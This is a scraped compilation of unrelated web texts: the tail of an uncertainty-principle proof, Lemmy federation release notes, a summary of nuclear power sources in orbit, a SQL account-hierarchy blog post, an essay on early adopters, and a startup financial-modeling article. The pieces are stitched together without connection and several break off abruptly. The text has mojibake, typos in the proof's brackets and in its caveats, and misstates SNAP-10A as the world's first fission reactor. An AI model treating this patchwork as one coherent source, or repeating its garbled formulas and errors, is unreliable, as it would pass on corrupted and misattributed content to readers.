</p><p>We use the imaginary part of vector inner product,</p><p>

\[\begin{align}
\mathbb{V}_{\psi}(\Omega_1) \mathbb{V}_{\psi}(\Omega_2) &amp;\geq \big| \text{Im}\big( \langle (\Delta_{\psi}(\Omega_1))\psi, (\Delta_{\psi}(\Omega_2))\psi \rangle \big) \big| ^ 2 \\
&amp;= \Big| \frac{1}{2i} \big(\langle (\Delta_{\psi}(\Omega_1))\psi, (\Delta_{\psi}(\Omega_2))\psi \rangle - \langle (\Delta_{\psi}(\Omega_2))\psi, \langle (\Delta_{\psi}(\Omega_1))\psi \rangle \big) \Big| ^ 2 \\
\end{align}\]

</p><p>We use the hermitian property again,</p><p>

\[\begin{align}
\mathbb{V}_{\psi}(\Omega_1) \mathbb{V}_{\psi}(\Omega_2) &amp;\geq \Big| \frac{1}{2i} \big(\langle (\Delta_{\psi}(\Omega_1))\psi, (\Delta_{\psi}(\Omega_2))\psi \rangle - \langle (\Delta_{\psi}(\Omega_2))\psi, \langle (\Delta_{\psi}(\Omega_1))\psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| \frac{1}{2i} \big(\langle (\Delta_{\psi}(\Omega_2)) (\Delta_{\psi}(\Omega_1))\psi, \psi \rangle - \langle (\Delta_{\psi}(\Omega_1)) (\Delta_{\psi}(\Omega_2))\psi, \psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| \frac{1}{2i} \big(\langle ( (\Delta_{\psi}(\Omega_2)) (\Delta_{\psi}(\Omega_1)) - (\Delta_{\psi}(\Omega_1)) (\Delta_{\psi}(\Omega_2)) ) \psi, \psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| \frac{1}{2i} \big(\langle ( (\Omega_2 - \langle \Omega_2 \rangle_{\psi} I) (\Omega_1 - \langle \Omega_1 \rangle_{\psi} I) - (\Omega_1 - \langle \Omega_1 \rangle_{\psi} I) (\Omega_2 - \langle \Omega_2 \rangle_{\psi} I) ) \psi, \psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| \frac{1}{2i} \big(\langle ( (\Omega_2 \Omega_1 - \langle \Omega_1 \rangle_{\psi} \Omega_2 - \langle \Omega_2 \rangle_{\psi} \Omega_1 + \langle \Omega_1 \rangle_{\psi} \langle \Omega_2 \rangle_{\psi} ) - (\Omega_1 \Omega_2 - \langle \Omega_2 \rangle_{\psi} \Omega_1 - \langle \Omega_1 \rangle_{\psi} \Omega_2 + \langle \Omega_1 \rangle_{\psi} \langle \Omega_2 \rangle_{\psi} ) ) \psi, \psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| \frac{1}{2i} \big(\langle  (\Omega_2 \Omega_1 - \Omega_1 \Omega_2)  \psi, \psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| \frac{1}{2i} \big(\langle  - [\Omega_1, \Omega_2]  \psi, \psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| -\frac{1}{2i} \big(\langle [\Omega_1, \Omega_2]  \psi, \psi \rangle \big) \Big| ^ 2 \\
&amp;= \Big| -\frac{1}{2i} \langle [\Omega_1, \Omega_2] \rangle_{\psi} \Big| ^ 2 \\
&amp;= \frac{1}{4} | \langle [\Omega_1, \Omega_2] \rangle_{\psi} | ^ 2 \\
\end{align}\]

</p><p>This concludes the proof.</p>

<h3 id="caveats">Caveats</h3>

<p>In Heisenberg’s general uncertainty principle, the commutator $[\Omega_1, \Omega_2] = 0$ suggests $\Omega_1 \Omega_2 = \Omega_2 \Omega_1$ and $\Omega_1 \Omega_2 | \psi \rangle = \Omega_2 \Omega_1 | \psi \rangle$. This means that the system states after the two sequential measures $\Omega_1 \Omega_2$ and $\Omega_1 \Omega_2$ are the same if $[\Omega_1, \Omega_2] = 0$. Otherwise, if $[\Omega_1, \Omega_2] \neq 0$ the system states after the two sequential measures $\Omega_1 \Omega_2$ and $\Omega_1 \Omega_2$ are not the same. If the commutator $[\Omega_1, \Omega_2] = 0$, Heisenberg’s general uncertainty principle suggests that the two physical observables that $\Omega_1$ and $\Omega_2$ are measuring would have not limit in precision.</p>



<p>In other expressions of Heisenberg’s general uncertainty principle, sometimes we would see the word “simultaneity”. How to understand the simultaneity in Heisenberg’s general uncertainty principle? Given measurement would change the system state, and it is almost impossible to achieve the absolute simultaneity in the time domain, what does the simultaneity mean in this case? Here simultaneity means that the order of measurement $\Omega_1$ and $\Omega_2$ do not change the final observation, as we tried hard to make them simultaneous and it is impossible to control the exact order of these two measurements. In short, simultaneity just means $[\Omega_1, \Omega_2] = 0$.</p>



<p>How to measure the variance of physical observable for a system state, as is shown at the left side of the inequality of Heisenberg’s general uncertainty principle? Measurement changes system state in quantum mechanics. We would need to create lots of clones of the system state. Once a system state is measured, it should be discarded and not be used for the measurement for the physical observable anymore. Measurement on the same system state means measurement on system state clones and not the exact system state.</p>

<h3 id="conclusions">Conclusions</h3>

<p>It is quite amazing that the Heisenberg’s general uncertainty principle could be derived in a such simple way. Unfortunately, the my college physics course instructor never showed a proof to this important principle.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>ðŸ¥³</p>
<h2>Changes</h2>
<p>Weâ€™ve been working at warp speed since our <code>v0.7.0</code> release in June, adding over <a href="https://github.com/LemmyNet/lemmy/compare/v0.7.0...main">870 commits</a> since then. :sweat:</p>
<p>Here are some of the bigger changes:</p>
<h3>LemmyNet projects</h3>
<ul>
<li>Created <a href="https://github.com/LemmyNet">LemmyNet</a>, where all lemmy-related projects live.</li>
<li>Split out the frontend into a separete repository, <a href="https://github.com/LemmyNet/lemmy-ui">lemmy-ui</a></li>
<li>Created a <a href="https://github.com/LemmyNet/lemmy-js-client">lemmy-js-client</a>, for any js / typescript developers.</li>
<li>Split out i18n <a href="https://github.com/LemmyNet/lemmy-translations">lemmy-translations</a>, that any app or site developers can import and use. Lemmy currently supports <a href="https://weblate.yerbamate.dev/projects/lemmy/lemmy/">~30 languages!</a></li>
</ul>
<h3>Lemmy Server</h3>
<h4>Federation</h4>
<ul>
<li>The first <strong>federation public beta release</strong>, woohoo ðŸŽ†</li>
<li>All Lemmy functionality now works over ActivityPub (except turning remote users into mods/admins)</li>
<li>Instance allowlist and blocklist</li>
<li>Documentation for <a href="https://dev.lemmy.ml/docs/administration_federation.html">admins</a> and <a href="https://dev.lemmy.ml/docs/contributing_federation_overview.html">devs</a> on how federation works</li>
<li>Upgraded to newest versions of @asonix activitypub libraries</li>
<li>Full local federation setup for manual testing</li>
<li>Automated testing for nearly every federation action</li>
<li>Many additional security checks</li>
<li>Lots and lots of refactoring</li>
<li>Asynchronous sending of outgoing activities</li>
</ul>
<h3>User Interface</h3>
<ul>
<li>Separated the UI from the server code, in <a href="https://github.com/LemmyNet/lemmy-ui">lemmy-ui</a>.</li>
<li>The UI can now read with javascript disabled!</li>
<li>Itâ€™s now a fully isomorphic application using <a href="https://infernojs.org/docs/guides/isomorphic">inferno-isomorphic</a>. This means that page loads are now much faster, as the server does the work.</li>
<li>The UI now also supports open-graph and twitter cards! Linking to lemmy posts (from whatever platform you use) looks pretty now: <img src="https://i.imgur.com/6TZ2v7s.png" alt=""></li>
<li>Improved the search page ( more features incoming ).</li>
<li>The default view is now <code>Local</code>, instead of <code>All</code>, since all would show all federated posts.</li>
<li>User settings are now shared across browsers ( a page refresh will pick up changes ).</li>
<li>A much leaner mobile view.</li>
</ul>
<h4>Backend</h4>
<ul>
<li>Re-organized the rust codebase into separate workspaces for backend and frontend.</li>
<li>Removed materialized views, making the database <strong>a lot faster</strong>.</li>
<li>New post sorts <code>Active</code> (previously called hot), and <code>Hot</code>. Active shows posts with recent comments, hot shows highly ranked posts.</li>
<li>New sort for <code>Local</code> ( meaning from local communities).</li>
<li>Customizeable site, user, and community icons and banners.</li>
<li>Added user preferred names / display names, bios, and cakedays.</li>
<li>Visual / Audio captchas through the lemmy API.</li>
<li>Lots of API field verifications.</li>
<li>Upgraded to pictrs-v2 ( thanks to @asonix )</li>
<li>Wayyy too many bugfixes to count.</li>
</ul>
<h2>Contributors</h2>
<p>Weâ€™d also like to thank both the <a href="https://nlnet.nl/">NLnet foundation</a> for their support in allowing us to work full-time on Lemmy ( as well as their support for <a href="https://nlnet.nl/project/current.html">other important open-source projects</a> ), <a href="https://dev.lemmy.ml/sponsors">those who sponsor us</a>, and those who <a href="https://weblate.yerbamate.dev/projects/lemmy/">help translate Lemmy</a>. Every little bit does help. We remain committed to never allowing advertisements, monetizing, or venture-capital in Lemmy; software should be communal, and should benefit humanity, not a small group of company owners.</p>
<h2>Upgrading</h2>
<ul>
<li><a href="https://dev.lemmy.ml/docs/administration_install_docker.html#updating">with manual Docker installation</a></li>
<li><a href="https://dev.lemmy.ml/docs/administration_install_ansible.html">with Ansible installation</a></li>
</ul>
<h2>Testing Federation</h2>
<p>Federation is finally ready in Lemmy, pending possible bugs or other issues. So for now we suggest to enable federation only on test servers, or try it on our own test servers ( <a href="https://enterprise.lemmy.ml/">enterprise</a>, <a href="https://ds9.lemmy.ml/">ds9</a>, <a href="https://voyager.lemmy.ml/">voyager</a> ).</p>
<p>If everything goes well, after a few weeks we will enable federation on <a href="http://dev.lemmy.ml/">dev.lemmy.ml</a>, at first with a limited number of trusted instances. We will also likely change the domain to <a href="https://lemmy.ml/">https://lemmy.ml</a> . Keep in mind that changing domains after turning on federation will break things.</p>
<p>To enable on your instance, edit your <a href="https://github.com/LemmyNet/lemmy/blob/main/config/defaults.hjson#L60">lemmy.hjson</a> federation section to <code>enabled: true</code>, and restart.</p>
<h3>Connecting to another server</h3>
<p>The server <a href="https://ds9.lemmy.ml/">https://ds9.lemmy.ml</a> has open federation, so after either adding it to the <code>allowed_instances</code> list in your <code>config.hjson</code>, or if you have open federation, you donâ€™t need to add it explicitly.</p>
<p>To federate / connect with a server, type in <code>!community_name@server.tld</code>, in your serverâ€™s search box <a href="https://voyager.lemmy.ml/search/q/!main%40ds9.lemmy.ml/type/All/sort/TopAll/page/1">like so</a>.</p>
<p>To connect with the <code>main</code> community on ds9, the search is <code>!main@ds9.lemmy.ml</code>.</p>
<p>You can then click the community, and you will see a local version of the community, which you can subscribe to. New posts and comments from <code>!main@ds9.lemmy.ml</code> will now show up on your front page, or <code>/c/All</code></p>

Here's a summary. There are many <a href="https://en.wikipedia.org/wiki/Radioisotope_heater_unit" target="_blank">radioisotope heater units</a> (RHUs) and <a href="https://en.wikipedia.org/wiki/Radioisotope_thermoelectric_generator" target="_blank">radioisotope thermoelectric generators</a> (RTGs) in space. Examples include the RHU used by <a href="https://en.wikipedia.org/wiki/Chang%27e_4" target="_blank">Chang'e 4</a> to survive cold lunar nights, the <a href="https://en.wikipedia.org/wiki/MHW-RTG" target="_blank">MHW-RTG</a>s in the Voyager probes, the <a href="https://en.wikipedia.org/wiki/GPHS-RTG" target="_blank">GPHS-RTG</a>s used by Cassini and New Horizons, and the <a href="https://en.wikipedia.org/wiki/Multi-mission_radioisotope_thermoelectric_generator" target="_blank">MMRTG</a>s at the heart of Curiosity, Perseverance, and the in-development Dragonfly. (Interestingly, an RTG using <sup>241</sup>Am has been <a href="https://en.wikipedia.org/wiki/Radioisotope_thermoelectric_generator#RTG_for_interstellar_probes" target="_blank">proposed for an interstellar mission</a> (<a href="http://www.niac.usra.edu/files/library/meetings/misc/trieste_may02_mtg/McNutt_Ralph.pdf" target="_blank">pdf</a>), as its 432-year half-life could provide 500+ years of power [<a href="http://www.niac.usra.edu/files/library/meetings/misc/trieste_may02_mtg/McNutt_Ralph.pdf" target="_blank">pdf</a>].) The world’s first nuclear fission reactor, and the only launched by the US, was <a href="https://en.wikipedia.org/wiki/SNAP-10A" target="_blank">SNAP 10-A</a>, a <sup>235</sup>Uranium-Zirconium hydride reactor with sodium-potassium (NaK) coolant which had a thermal power output of 30 kW. It was launched in 1965, stopped working after just 43 days, and has had <em>seven</em> “anomalous events” that caused nearly 50 trackable pieces of debris to be shed from the craft. It should stay in orbit for 3,000 years… unless it breaks up further. The other ~30 known fission reactors were launched in <a href="https://en.wikipedia.org/wiki/US-A" target="_blank">Soviet RORSATs</a>: nuclear-powered LEO ocean-surveillance radar satellites that required periodic boosts to prevent reentry. They were designed to launch their <sup>235</sup>U reactors to a higher orbit at the end of their operational lives. (These orbits will last 300-1,000 years, but the reactor fuel has a half-life of 70,000 years… so future generations may not love the plan.) But, these boosts didn’t always happen: in 1978, the <a href="https://en.wikipedia.org/wiki/Kosmos_954" target="_blank">Cosmos 954 RORSAT</a> malfunctioned, reentered, and broke apart over northern Canada with the reactor attached, scattering radioactive debris over an 800 km long path—the USSR eventually paid $3M for cleanup, about a fifth of the true cost. Other satellites have also broken up in orbit, spreading radioactive debris, like the US’s Transit 5BN3 (carrying a <a href="https://en.wikipedia.org/wiki/Systems_for_Nuclear_Auxiliary_Power#SNAP-9" target="_blank">SNAP RTG</a>) and the USSR’s <a href="https://en.wikipedia.org/wiki/Kosmos_1402" target="_blank">Cosmos 1402 RORSAT</a>. Others, including the higher power and higher orbit <a href="https://en.wikipedia.org/wiki/Kosmos_1818" target="_blank">Kosmos 1818</a> and <a href="https://en.wikipedia.org/wiki/Kosmos_1867" target="_blank">Kosmos 1867</a> RORSATs, have leaked trails of radioactive NaK coolant. The usefulness of the Gamma Ray Spectrometer on NASA’s <a href="https://en.wikipedia.org/wiki/Solar_Maximum_Mission" target="_blank">SolarMax</a> mission was reduced by <a href="http://www.svengrahn.pp.se/trackind/RORSAT/RORSAT.html#Kosmos-1867" target="_blank">anomalous gamma ray emissions from these leaking higher-orbit reactors</a>.

            <section>
                <div>
                    <p>Bottoms-up growth is a buzzy go-to-market technique right now. From the exciting self-service adoption of products like Figma to the record breaking growth of Zoom, products that enable individuals to adopt a tool without first having to talk to sales is a winning strategy. Customers get started faster, and because they understand the product, they don’t need to be marketed or sold to in order to make a purchase decision.</p><p>But these companies are finding that self-service adoption is only the first step in a customer journey. For the business to grow, individuals and teams adoption needs to eventually lead to enterprise sales. Sure, in the best case that happens naturally as excitement inside the company forces a CIO’s decision. More often than not though, it still requires traditional sales to step in. </p><p>The tricky part is that all that self-service usage data is messy. There’s nothing stopping people from signing up with personal emails or multiple people at the same company from signing up for their own teams, completely independently from each other. All of this easy adoption leaves you with multiple different teams and overlapping users, all working for the same employer. Cutting through the noise for Sales, Marketing, and Success teams requires bringing order to the chaos. </p><p>Today, we’ll talk through how you can structure product data into account hierarchies that are actionable, all within SQL and your Data Warehouse. Here's what we'll cover:</p><ul><li>How to identify companies</li><li>Understanding your current product data model</li><li>Aggregating product data into companies</li><li>Using your new hierarchy</li></ul><h2 id="identifying-companies">Identifying companies</h2><div><p>It all starts by figuring out what real world companies are using your product. And in order to identify a unique, real world company, we need a reliable identifier. Unfortunately, that may not be immediately obvious if you’re just looking at a list of users that have signed up to start using your product. But we have one very obvious hint: domain names that appear in users email addresses. </p><p>Domain names are the easiest place to start building an account hierarchy. They’re easy for humans to understand and debug. And users are often providing them directly to you as part of their email address. Alternatively, you can also ask users to provide this domain as they’re signing up to your product. </p><p>To start building our account hierarchy of companies, we’ll create a set of all the domain names that appear in our database. There’s some obvious issues to this (A very common example gmail.com users) and we’ll address them along the way. So let’s see what domains we have.</p></div><h2 id="understanding-your-data-model">Understanding your data model</h2><figure><img src="https://blog.getcensus.com/content/images/2020/10/Understanding-your-data-model.png" alt="Understanding your data model" srcset="https://blog.getcensus.com/content/images/size/w600/2020/10/Understanding-your-data-model.png 600w, https://blog.getcensus.com/content/images/size/w1000/2020/10/Understanding-your-data-model.png 1000w, https://blog.getcensus.com/content/images/size/w1600/2020/10/Understanding-your-data-model.png 1600w, https://blog.getcensus.com/content/images/2020/10/Understanding-your-data-model.png 2080w" sizes="(min-width: 720px) 720px"></figure><p>We’re going to be translating one model to the other so before we dive in, let's get a handle on what your data looks like currently and where it’s located. It may be spread across a few different tables, it may not even be in your data warehouse (<a href="https://blog.getcensus.com/graduating-to-the-modern-data-stack-for-startups/">you do have a data warehouse, right?</a>). </p><p>One thing to keep an eye out for: does your product have a workspace concept? You might call it an organization, a group, or a team. This group is a really powerful hint we can use for identifying companies. If you do have workspaces, you’ll also need to know who is the “owner” of a workspace. This is typically the user that created it, but you may have a better identifier such as admin.</p><p>With your users and your workspaces, you can use some basic SQL to extract the domain from an email address. For each user and workspace, you now know which Company they belong to. We can use this to start aggregating our users.</p><p>Pro tip: You may have situations where companies are represented by more than one domain. In this case, you’ll want to add the ability to associate secondary domains to a primary domain as part of rolling up workspaces together.</p><h2 id="aggregating-into-companies">Aggregating into Companies</h2><p>The simplest hierarchy is </p><ul><li>GROUP BY domain</li><li>COUNT(*) of users or workspaces</li></ul><p>We’ve got the start of our account hierarchy. We can roll up more metrics from here. For each metric, it’s a matter of thinking about what sort of aggregation makes sense at the company level, ie SUM, AVG, MAX</p><p>What about personal email domain users like gmail.com or outlook.com? Well, that depends a bit on your business. You have three options, and the right option for you depends on what percentage of your user base use personal accounts</p><p><strong>1) Ignore them</strong><br>This is a completely reasonable option and the best place to start. Chances are, users that provided a personal email address are likely using your product for personal reasons. For example, someone using Notion to track their sourdough recipes are not going to be interested in Enterprise Single Sign-on features. So, you may want to just ignore them. You can do that by simply ignoring every domain in this <a href="https://gist.github.com/tbrianjones/5992856/">comprehensive list of public email domains</a>.</p><p><strong>2) Roll up to a single account</strong><br>You could also translate all of the personal usage into a separate Public Email catch all company/account. This is a great strategy if you plan to connect these users/leads to other parts of your marketing automation and don’t need company information. If you’re planning on publishing this data to a CRM however, it’s really only worth while if you plan on having a human review the users that end up associated with this account.</p><p><strong>3) Use firmographic data </strong><br>The most advanced option is incorporate firmographic data such as data provided by Clearbit, Zoominfo, or FullContact to translate a personal email address into an employer. Note that this data is not perfectly accurate so you may end up linking users to their previous employers or to someone completely unrelated to them. </p><h2 id="using-your-new-hierarchy">Using your new hierarchy</h2><figure><img src="https://blog.getcensus.com/content/images/2020/10/Using-your-new-hierarchy--1-.png" alt="Using your new data hierarchy diagram" srcset="https://blog.getcensus.com/content/images/size/w600/2020/10/Using-your-new-hierarchy--1-.png 600w, https://blog.getcensus.com/content/images/size/w1000/2020/10/Using-your-new-hierarchy--1-.png 1000w, https://blog.getcensus.com/content/images/size/w1600/2020/10/Using-your-new-hierarchy--1-.png 1600w, https://blog.getcensus.com/content/images/2020/10/Using-your-new-hierarchy--1-.png 2080w" sizes="(min-width: 720px) 720px"></figure><p>Now that you’ve got your Account Hierarchy up and running, you can start putting it to use. Census makes it easy to connect the data models you build in your Data Warehouse to the Sales and Marketing products you use to drive your Customer Journey, but how that journey unfolds is completely up to you.</p><p>What you’ve built is a Business Identity model that you can share across all of your products and tools. Census helps you associate this product model with all the other tools you use to serve your customer.</p><p>Here’s just a few ideas:</p><ul><li><strong>Enrich your existing accounts and contacts with usage data</strong> - Use this data to give account reps context on what users are doing in product without searching across all your tools</li><li><strong>Identify net new logos</strong> - Use the data to identify companies that are actively using the product but are not yet in your CRM. Congratulations, you now have product qualified leads!</li><li><strong>Orchestrate Sales and Marketing at the same Account-oriented goals</strong> - Account Based Marketing requires Sales and Marketing to target the same accounts, but not necessarily the same contacts within those accounts. Use your new account hierarchy to share target lists between both sales and marketing</li></ul><p>The sky’s the limit! This is meant to be a data platform you can build upon. Add more product metrics, incorporate data form other SaaS tools and more. We’re excited to see what you do with your account hierarchy. Keep an eye on this space for more customer success stories and other tricks to get the most out of your product data.</p><p>if you have any questions, <a href="mailto:sean@getcenus.com">contact me!</a> I always move geeking about these data problems.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/Article"><header><p>October 08, 2020</p></header><section itemprop="articleBody"><p>Any successful founder will tell you that team, product, and market are the most critical factors to building a successful business. And you’ll probably hear many of them talk about being “customer-obsessed” or “customer first.” But one of the most underrated factors in their success is not just the customers but also the quality of their early adopters.</p>
<p>While we can all agree that early adopters are good, they are not all created equal. The wrong users can derail entrepreneurs, causing them to lose focus and solve the wrong problems. Like a bad team or poor product, the wrong early adopters can push a company towards failure.</p>
<p>You should be picky about who you serve, especially during the initial phase of your product development process. Finding early adopters should be an investment similar to hiring a team. Entrepreneurs should recruit, interview, qualify, and partner with early adopters that will help them become most successful. It’s not a simple process and shouldn’t be taken for granted.</p>
<p>So how do you find the right early adopters? That’s a difficult question to answer. It’s all going to come down to your market, product, and judgment. But here are some characteristics that you should look for.</p>
<h2>They are in real pain.</h2>
<p>The right early users are deeply affected by the problem that you’re solving. They know the problem exists and are hungry for a better solution. They’ve probably tried other solutions and yearn for something better.</p>
<p>Early adopters will be keenly aware of the problem. They will explain the problem in various ways and how it affects their ability to work, live, or perform some activity. They’ve probably even tried to solve it somehow, maybe using Excel, some no-code app, a third-party tool, or a manual process.</p>
<h2>Their problem is very specific.</h2>
<p>Users have all kinds of problems. Most of which you’ll never solve. Others might be in your roadmap but are not core today. It’s essential to focus on users with the specific problem that you are solving for. Problems can emerge from various systems, workflows, and integrations that have nothing to do with the core problem or your potential solution. Eliminate the users who are looking to solve all of their problems. Eliminate the users who want a different, possibly related, problem solved.</p>
<p>The best early adopters need to solve a specific problem. It’s vital to ensure that it matches your vision and product solution.</p>
<h2>They are excited to help you.</h2>
<p>The solution you’re offering them is going to alleviate a pain point, and the best early adopters are more than excited to help you help them. The more excited they are, the more pain they experience from the problem.</p>
<p>Early adopters are partners. They should be excited about working with you, helping you solve their problem, and providing feedback. They should also be excited that they will be using your solution before others and developing a competitive edge as well.</p>
<p>When you acquire great early adopters, they will be the ones sending you feedback often and with excitement. They’ll be proud to help you craft your solution and feel like their part of the team.</p>
<h2>They are empowered</h2>
<p>Early adopters must be empowered to make decisions quickly. Working with your dream enterprise customer sounds great, but if they can’t get approval, move quickly, or activate your solution, you’ll be at the mercy of their bureaucracy.</p>
<p>Working with early adopters is a partnership, not a transaction. It’s important that early adopters can take your prototype, beta, or product and implement it within their team or organization.</p>
<p>The person is as vital as the company. Are they authorized to make the right decisions? Can they dedicate the time and resources to the problem and solution? Are they empowered to help you create the right solution? If they can’t meet these criteria, you should find another early adopter who can.</p>
<h2>They have a high-risk tolerance.</h2>
<p>The best products are built with customers, through an iterative process of trial and error. Early adopters who experience the pain are not enough; you need a partner who can tolerate the risks involved in the product development process. Not only do they have a high-risk tolerance, but they should also be willing and able to engage in ongoing experiments throughout the process.</p>
<p>Experimentation is critical to the process. You need to ensure that you partner with a customer that recognizes the process is about learning and improvement, not a finished product.</p>
<p>When interviewing customers, you should be upfront about this process and ensure they are comfortable with it. It’s okay if a potential customer can’t commit to the process, you can keep in touch and invite them to the product when it’s a bit more developed.</p>
<h2>Hire early adopters, don’t settle.</h2>
<p>Don’t just settle for the first few customers that show interest in your product. Spend time doing market mapping to better understand the market, sectors, and potential customers. Learn more about the companies and find who the best possible contacts would be. Reach out and conduct interviews to learn more about their organization, how the problem affects them, and their goals regarding the problem and solution. Make sure to dig in and ask tough questions to assess their risk-tolerance, current solutions, and whether they are authorized to make the necessary decisions.</p>
<p>If a potential customer seems like the problem isn’t that big of a deal, you should move on. If they can’t focus on just the one problem, move on. If they aren’t authorized to make decisions, ask about their manager and see if you can work your way up.</p>
<p>You should spend a good amount of time learning about each of these customers and selecting the best candidates. Don’t hesitate to reach out multiple times and have conversations with them to build confidence in your decisions. These will be partners as you experiment and craft your solution, so ensure you find the best possible partners.</p>
<h2>They’re all leads, too.</h2>
<p>Choosing the best early adopters doesn’t mean that the others will not be good future customers. All of these customers are now leads. Some might be great customers once you hit a particular milestone and finish more features; others might be customers down the road. Keep in touch and share updates on the product and feature set.</p>
<p>Recruiting high-quality early adopters is difficult but vital to the success of a company. Spend the time upfront to say no to customers that don’t fit your current vision and mission. While the process is difficult and costly, it’ll be worth the investment as the product matures.</p></section></article></div>]]>

More accurately, the “debate” was a strong adverse reaction from Troy after I shared a template I built for Prota Ventures’ portfolio companies. His feedback was, essentially, to never use a template and instead build each model from scratch.</em></p><p><em>He invited me to a 90-minute lecture he gave where he overwhelmingly convinced me and the room that, indeed, founders need to take the time necessary to build their models from scratch. After I asked him where I could find his lecture material online, he suggested we co-author this article series since there weren’t many solid resources available. We sincerely hope you find this series helpful.&nbsp;</em></p><p>Our plan is to break this out into a four-part series and guide you through the components necessary for building your own financial model from scratch:</p><ul data-rte-list="default"><li><p><a href="https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model" target="_blank">Part 1: The Why and What of Financial Modeling</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/2/startup-financial-modeling-part-2-start-with-your-assumptions" target="_blank">Part 2: Assumptions</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/2/startup-financial-modeling-part-3-the-income-statement-and-custom-detail-tabs" target="_blank">Part 3: Income Statement and Custom Detail Tabs</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/7/startup-financial-modeling-part-4-the-balance-sheet-cash-flow-and-unit-economics" target="_blank">Part 4: Cash Flow, Balance Sheet and Keeping the Model Updated</a></p></li></ul><p>In short, a financial model is an abstract mathematical representation of how a company works (and more importantly, how it will work going forward). The model has inputs and outputs. The inputs are the assumptions that drive the model, things like what drives your customer acquisition cost, what your churn rates are, how much you pay people, etc. The outputs are a set of projections that show how the company will perform if the assumptions are true. One model can produce multiple sets of projections given different assumptions.</p><p>Based on a set of assumptions, a financial model is used to make smart decisions (e.g. how many sales people to hire and what to pay them). The model includes financial projections that are tied mathematically to the assumptions, which allows operators to “play with the variables” in order to understand how certain decisions might affect the future health of their company.</p><p><strong>Troy has an important story to share on this topic:</strong></p><p>“When fundraising for SurePayroll, we had some very high level financials in the pitch deck. Inevitably, VC’s would ask where the numbers came from. I would tell them that we had a very detailed financial model that drove it, I was setting the bait…</p><p>They would ask to be sent a copy of the model and I would refuse. I would only share it by first sitting down with them and an associate and reviewing the model in person and after that 90 minute session, I would leave them a copy of the model to play with further.</p><blockquote><p>They would insist that they could figure it out without the meeting, but I ALWAYS held my ground. I wanted the meeting not just to save them time and frustration learning a new model, but more importantly to get more face time with them in a situation where I was going to shine.</p></blockquote><p>I knew the model inside and out since I built it; I could answer any question about any cell and look like a genius. In the end, I did eight&nbsp;of these meetings and EVERY ONE of the firms that did the 90 minute meeting with me on the financial model either made an investment in the company or made an offer to invest in the company.&nbsp;<strong>Every single one</strong>.”</p><p>While it’s easy to search around and find a template to use, those templates were built by someone with a particular business in mind. Since every business is unique, this will lead you into trouble.</p><p>While it’s often helpful to&nbsp;<em>learn&nbsp;</em>from other people’s models to ensure, for example, that you aren’t missing anything important, you should never build your model using their template. You’ll end up banging your head against a wall when you need to change things, and you’ll inevitably be confused about some nuance that will come back to haunt you since you don’t understand it.</p><blockquote><p>In other words, while you may think that a template will help you save time, what you are actually doing is acquiring “technical debt” that will end up costing you more time in the long run.</p></blockquote><p>Plus, it’s critical to understand every column, row, cell and tab in your spreadsheet for two key reasons; it will help you better manage your business, and when the time comes to explain it to an investor, you’ll be able to explain exactly how it works and increase your odds of landing funding.</p><p>Since most people are using the financial model to communicate projections to investors, it is critical that you speak the investors’ language. They are used to having financials in Excel, so you should build your model in Excel.</p><blockquote><p>Google sheets is convenient for making changes and having multiple people editing, but sending an investor a model in Google sheets signals that you are not financially savvy.</p></blockquote><p>Investors are also used to seeing three standard statements; an income statement, a balance sheet, and a statement of cash flow. &nbsp;Each of these is more credible if it has BOTH the past performance and the future projections in the same spreadsheet.</p><p>Your spreadsheet should contain a tab for each of these outputs along with an “assumptions” tab and custom detail tabs needed to help calculate the main outputs. We’ll walk through a specific example later in this series so you have a better understanding of what this should look like.</p><p>Because of various accounting nuances – such as fixed asset depreciation and deferring revenue – if you assign ten accountants to finish your books at the end of the year, you’ll get ten different answers for how much profit (or loss) you had in the year. While hopefully not far off from the others, each will have a slightly different report of your “profit” based on their accounting opinions.</p><blockquote><p>However, the balance of your bank account is a specific number to point at; it’s a fact that your ten accountants should agree on.</p></blockquote><p>Therefore, it’s important to remember that your financial model will have your own opinions baked in regarding your profit. This means that examining your cash flow carefully as you fine-tune your business assumptions is critical.</p><p>Having a solid financial model is a significant step in communicating to investors that you are a logical thinker with a defensible plan and clearly understand your business and the levers that drive it. &nbsp;&nbsp;</p><p>Nobody expects your model to be perfect, as a matter of fact, when we present a model, we always open with the same line:</p><blockquote><p><em>“The only thing we know for sure about this model is that it is wrong. But, if we look critically at it we can better understand the drivers of the business and what we need to be focused on to reduce our risk.” &nbsp;</em></p></blockquote><p>Keep in mind, investors are looking for the big home runs, but they are also looking at reducing their risk. The model can help them get comfortable with the risk.</p><p>– – –</p><p><em>In our next post in this series, we’ll dive in a step-by-step guide of how to build a financial model, starting with the assumptions tab.&nbsp;</em><a href="https://satchel.works/@wclittle/subscribe" target="_blank">Subscribe</a><em>&nbsp;to Will’s newsletter to get notified when the next articles are up.

